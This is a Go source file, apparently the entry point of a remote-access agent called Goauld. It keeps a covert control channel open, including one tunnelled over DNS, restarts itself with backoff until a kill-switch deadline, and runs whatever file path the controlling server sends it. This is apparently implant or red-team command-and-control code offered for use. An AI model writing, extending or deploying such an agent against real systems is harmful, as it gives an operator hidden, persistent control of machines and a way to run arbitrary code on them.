//go:build mini

package main

import (
	globalcontext "Goauld/agent/context"
	"Goauld/agent/control"
	"Goauld/agent/ssh/transport"
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"Goauld/agent/config"
	"Goauld/common/log"

	"github.com/cenkalti/backoff/v5"
)

var globalCanceler *globalcontext.GlobalCanceler

type Path string

func main() {
	// Initialize the agent using the provided parameters (Command line, configuration file, environment variable)
	config.InitAgent()

	if len(config.Get().IgnoredArgs()) > 0 {
		log.Warn().Str("Args", strings.Join(config.Get().IgnoredArgs(), " / ")).Msg("ignored arguments")
	}

	killSwitchDuration := KillSwitchLoop(config.Get().GetKillSwitchDays(), globalCanceler)
	// Define an operation function that returns a value and an error.
	// The value can be any type.
	// We'll pass this operation to Retry function

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	operation := func() (any, error) {
		log.Info().Msg("Starting agent")

		cancelReason := run()
		if cancelReason.Status == globalcontext.Exit {
			log.Kill().Str("Reason", cancelReason.Msg).Msg("Agent stopped")
			cancel()
			//nolint:nilnil
			return nil, nil
		}
		if cancelReason.Status == globalcontext.Dropped {
			log.Info().Str("Path", cancelReason.Msg).Msg("Agent dropped")
			cancel()
			return Path(cancelReason.Msg), nil
		}
		log.Reset().Str("Reason", cancelReason.Msg).Msg("Agent restarting")

		return nil, fmt.Errorf("agent restarting: %s", cancelReason.Msg)
	}

	exp := &backoff.ExponentialBackOff{
		InitialInterval:     time.Second,
		RandomizationFactor: 2,
		Multiplier:          1.5,
		MaxInterval:         5 * time.Minute,
	}
	result, err := backoff.Retry(
		ctx,
		operation,
		backoff.WithBackOff(exp),
		backoff.WithMaxTries(config.Get().GetMexRetries()),
		backoff.WithMaxElapsedTime(killSwitchDuration),
		backoff.WithNotify(func(_ error, _ time.Duration) {

		}),
	)

	if p, ok := result.(Path); ok {
		result = nil
		err = Exec(p, config.Get())
	}
	if err != nil {
		log.Info().Err(err).Msg("Agent shut down")

		return
	}
	if result != nil {
		//nolint:forbidigo
		fmt.Println(result)
	}
}

func run() globalcontext.CancelReason {
	var dnsTransport *transport.DNSSH
	cancelReason := make(chan globalcontext.CancelReason)
	controlErr := make(chan error)

	// dropDone is a one time chan used to signal that the configuration exchange with the server is completed.
	// The signal is emitted by the socket.io handler, and the agent waits for it before starting component initialization
	// (sshd, ssh, socks, etc.)
	dropDone := make(chan string)
	log.Info().Msg("Agent init done")

	ctx, cancel := context.WithCancel(context.Background())
	globalCanceler = &globalcontext.GlobalCanceler{
		Cancel:       cancel,
		CancelReason: cancelReason,
	}
	defer cancel()

	controlInitStrategy["DNS"] = control.InitStrategy{
		Name:     "DNS",
		InitFunc: ClosureInitControlOverDNS(dnsTransport),
	}

	success, controlPlanClient := InitControl(ctx, globalCanceler, dropDone, controlErr)

	// If no strategy was successful, we restart the agent
	if !success {
		return globalcontext.CancelReason{
			Status: globalcontext.Restart,
			Msg:    "unable to init the control plan",
		}
	}

	if dnsTransport != nil {
		defer func(dnsTransport *transport.DNSSH) {
			err := dnsTransport.Close()
			if err != nil {
				log.Debug().Err(err).Msg("error while closing dns transport")
			}
		}(dnsTransport)
	}

	cancelCtrlC := HandleCtrlC(controlPlanClient, globalCanceler)
	defer cancelCtrlC()

	// Wait for errors to occur and print them
	select {
	case err := <-controlErr:
		if err != nil {
			log.Error().Err(err).Msg("error starting the agent")
		}

	case <-ctx.Done():
		log.Error().Err(ctx.Err())
	case path := <-dropDone:
		return globalcontext.CancelReason{
			Status: globalcontext.Dropped,
			Msg:    path,
		}
	}
	reason := <-cancelReason

	return reason
}

func Exec(p Path, cfg *config.Agent) error {
	cmd := exec.Command(string(p))
	cmd.Env = append(os.Environ(), cfg.Env()...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}
